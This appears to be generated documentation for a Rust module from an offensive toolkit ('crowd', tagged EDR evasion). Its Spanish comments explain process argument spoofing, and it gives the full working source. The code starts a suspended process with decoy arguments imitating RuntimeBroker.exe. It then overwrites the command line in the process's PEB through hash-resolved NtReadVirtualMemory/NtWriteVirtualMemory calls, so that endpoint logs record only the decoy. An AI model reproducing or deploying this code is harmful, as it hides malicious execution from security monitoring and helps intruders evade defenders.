# crowd — arg_spoof.rs  (✅ C TIER — PEB manipulation utility, zero Win32 calls)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/arg_spoof.rs` |
| **Lines** | 196 |
| **Tier** | P |
| **Cards** | T009-edr-evasion |
| **Role** | Argument spoofing |
| **Unsafe blocks** | 2 |

## Purpose

# crowd — arg_spoof.rs  (✅ C TIER — PEB manipulation utility, zero Win32 calls)

## Process Argument Spoofing

Crear el proceso con argumentos benignos (visibles en logs de creación),
luego sobreescribir `ProcessParameters->CommandLine` en el PEB del proceso
suspendido con los argumentos reales antes de resumirlo.

### Por qué funciona
Los EDR que loguean creación de procesos capturan el CommandLine en el
evento de creación (antes del thread resume). Si el proceso arranca suspendido
y luego se modifica el PEB, los logs contienen los args benignos.

### Implementación
1. `NtCreateUserProcess` con args benignos (en ppid.rs)
2. `NtQueryInformationProcess` → obtener PEB address del hijo
3. Leer `PEB.ProcessParameters` (offset 0x20 en x64)
4. `NtWriteVirtualMemory` → sobreescribir `CommandLine.Buffer` + `Length`
5. El proceso hijo ve los args reales al ejecutar

OPSEC: Zero trazas del real CommandLine en el eventlog de creación.

## Constants

- `CMDLINE_LENGTH_OFFSET`: `usize` = `0x70`
- `CMDLINE_BUFFER_OFFSET`: `usize` = `0x78`
- `CMDLINE_MAXLENGTH_OFFSET`: `usize` = `0x72`
- `BENIGN_ARGS`: `&str` = `"RuntimeBroker.exe -Embedding"`

## Types

### struct `ProcessBasicInfo` (line 40)

## Public API

### `spoof_args_in_peb` (line 33)
```rust
pub fn spoof_args_in_peb(h_process: usize, real_args: &str) -> Result<()>
```
Sobrescribe los argumentos en el PEB de un proceso suspendido.

- `h_process`: handle al proceso suspendido (PROCESS_ALL_ACCESS).
- `real_args`: los argumentos reales a escribir (sin el exe path, solo args).

El proceso debe estar suspendido antes de llamar esta función.

## Internal Functions

- `inner_spoof` (unsafe) (line 37)

## Key Dependencies

- `use anyhow::{anyhow, Result};`

## Full Source

```rust
//! # crowd — arg_spoof.rs  (✅ C TIER — PEB manipulation utility, zero Win32 calls)
//!
//! ## Process Argument Spoofing
//!
//! Crear el proceso con argumentos benignos (visibles en logs de creación),
//! luego sobreescribir `ProcessParameters->CommandLine` en el PEB del proceso
//! suspendido con los argumentos reales antes de resumirlo.
//!
//! ### Por qué funciona
//! Los EDR que loguean creación de procesos capturan el CommandLine en el
//! evento de creación (antes del thread resume). Si el proceso arranca suspendido
//! y luego se modifica el PEB, los logs contienen los args benignos.
//!
//! ### Implementación
//! 1. `NtCreateUserProcess` con args benignos (en ppid.rs)
//! 2. `NtQueryInformationProcess` → obtener PEB address del hijo
//! 3. Leer `PEB.ProcessParameters` (offset 0x20 en x64)
//! 4. `NtWriteVirtualMemory` → sobreescribir `CommandLine.Buffer` + `Length`
//! 5. El proceso hijo ve los args reales al ejecutar
//!
//! OPSEC: Zero trazas del real CommandLine en el eventlog de creación.

#![allow(dead_code)]

use anyhow::{anyhow, Result};

/// Sobrescribe los argumentos en el PEB de un proceso suspendido.
///
/// - `h_process`: handle al proceso suspendido (PROCESS_ALL_ACCESS).
/// - `real_args`: los argumentos reales a escribir (sin el exe path, solo args).
///
/// El proceso debe estar suspendido antes de llamar esta función.
pub fn spoof_args_in_peb(h_process: usize, real_args: &str) -> Result<()> {
    unsafe { inner_spoof(h_process, real_args) }
}

unsafe fn inner_spoof(h_process: usize, real_args: &str) -> Result<()> {
    // ── Paso 1: obtener PEB address via NtQueryInformationProcess ─────────────
    #[repr(C)]
    struct ProcessBasicInfo {
        exit_status:                 usize,
        peb_base_address:            usize,
        affinity_mask:               usize,
        base_priority:               isize,
        unique_process_id:           usize,
        inherited_from_unique_pid:   usize,
    }
    let mut pbi: ProcessBasicInfo = std::mem::zeroed();
    let mut return_len: u32 = 0;
    let status = crate::recycled::nt_query_information_process(
        h_process,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut u8,
        std::mem::size_of::<ProcessBasicInfo>() as u32,
        &mut return_len,
    );
    if status != 0 || pbi.peb_base_address == 0 {
        return Err(anyhow!("NtQueryInformationProcess failed: 0x{:x}", status as u32));
    }

    let peb_base = pbi.peb_base_address;

    // ── Paso 2: leer PEB.ProcessParameters (offset 0x20 en x64) ──────────────
    // PEB layout (x64): +0x20 = ProcessParameters (*RTL_USER_PROCESS_PARAMETERS)
    let proc_params_addr_rva = 0x20usize;
    let mut proc_params_ptr: usize = 0;
    let mut bytes_read: usize = 0;
    let rd_status = crate::recycled::invoke(
        crate::resolve::compute_hash("NtReadVirtualMemory"),
        5,
        &[
            h_process,
            (peb_base + proc_params_addr_rva) as usize,
            &mut proc_params_ptr as *mut usize as usize,
            std::mem::size_of::<usize>(),
            &mut bytes_read as *mut usize as usize,
        ],
    );
    if rd_status != 0 || proc_params_ptr == 0 {
        return Err(anyhow!("ReadVirtualMemory(PEB.ProcessParameters) failed: 0x{:x}", rd_status as u32));
    }

    // ── Paso 3: prepara el nuevo CommandLine como UNICODE_STRING ──────────────
    // RTL_USER_PROCESS_PARAMETERS layout (x64):
    //   ... (various fields) ...
    //   +0x70 = CommandLine.Length       (USHORT)
    //   +0x72 = CommandLine.MaximumLength (USHORT)
    //   +0x78 = CommandLine.Buffer        (*WCHAR)
    const CMDLINE_LENGTH_OFFSET: usize = 0x70;
    const CMDLINE_BUFFER_OFFSET: usize = 0x78;

    // Read current CommandLine.MaximumLength (USHORT at +0x72) for bounds checking
    const CMDLINE_MAXLENGTH_OFFSET: usize = 0x72;
    let mut remote_max_length: u16 = 0;
    let rd_maxlen_status = crate::recycled::invoke(
        crate::resolve::compute_hash("NtReadVirtualMemory"),
        5,
        &[
            h_process,
            proc_params_ptr + CMDLINE_MAXLENGTH_OFFSET,
            &mut remote_max_length as *mut u16 as usize,
            std::mem::size_of::<u16>(),
            &mut bytes_read as *mut usize as usize,
        ],
    );
    if rd_maxlen_status != 0 {
        return Err(anyhow!("ReadVirtualMemory(CommandLine.MaximumLength) failed: 0x{:x}", rd_maxlen_status as u32));
    }

    // Read current Buffer pointer (so we know where to write)
    let mut cmd_buffer_ptr: usize = 0;
    let rd_buf_status = crate::recycled::invoke(
        crate::resolve::compute_hash("NtReadVirtualMemory"),
        5,
        &[
            h_process,
            proc_params_ptr + CMDLINE_BUFFER_OFFSET,
            &mut cmd_buffer_ptr as *mut usize as usize,
            std::mem::size_of::<usize>(),
            &mut bytes_read as *mut usize as usize,
        ],
    );
    if rd_buf_status != 0 {
        return Err(anyhow!("ReadVirtualMemory(CommandLine.Buffer) failed: 0x{:x}", rd_buf_status as u32));
    }

    if cmd_buffer_ptr == 0 {
        return Err(anyhow!("CommandLine.Buffer is null in target PEB"));
    }

    // Encode new CommandLine as UTF-16
    let real_wide: Vec<u16> = real_args.encode_utf16().collect();
    let byte_len = real_wide.len() * 2;

    // Bounds check: ensure new command line fits within MaximumLength to
    // prevent buffer overflow in the remote process's address space.
    if byte_len as u16 > remote_max_length {
        return Err(anyhow!(
            "arg_spoof: new CommandLine ({} bytes) exceeds remote MaximumLength ({} bytes) — would overflow",
            byte_len, remote_max_length
        ));
    }

    // ── Paso 4: NtWriteVirtualMemory → sobreescribir el Buffer ───────────────
    let mut written: usize = 0;
    let wr_status = crate::recycled::invoke(
        crate::resolve::compute_hash("NtWriteVirtualMemory"),
        5,
        &[
            h_process,
            cmd_buffer_ptr,
            real_wide.as_ptr() as usize,
            byte_len,
            &mut written as *mut usize as usize,
        ],
    );
    if wr_status != 0 {
        return Err(anyhow!("NtWriteVirtualMemory(CommandLine.Buffer) failed: 0x{:x}", wr_status as u32));
    }

    // ── Paso 5: actualizar Length / MaximumLength ─────────────────────────────
    let new_len = byte_len as u16;
    let new_max = byte_len as u16 + 2;

    // Write Length (USHORT at +0x70)
    let _ = crate::recycled::invoke(
        crate::resolve::compute_hash("NtWriteVirtualMemory"),
        5,
        &[
            h_process,
            proc_params_ptr + CMDLINE_LENGTH_OFFSET,
            &new_len as *const u16 as usize,
            2usize,
            &mut written as *mut usize as usize,
        ],
    );

    // Write MaximumLength (USHORT at +0x72)
    let _ = crate::recycled::invoke(
        crate::resolve::compute_hash("NtWriteVirtualMemory"),
        5,
        &[
            h_process,
            proc_params_ptr + CMDLINE_LENGTH_OFFSET + 2,
            &new_max as *const u16 as usize,
            2usize,
            &mut written as *mut usize as usize,
        ],
    );

    Ok(())
}

/// Benign decoy arguments — visible in process creation events.
/// Matches typical RuntimeBroker.exe launch args.
pub const BENIGN_ARGS: &str = "RuntimeBroker.exe -Embedding";

```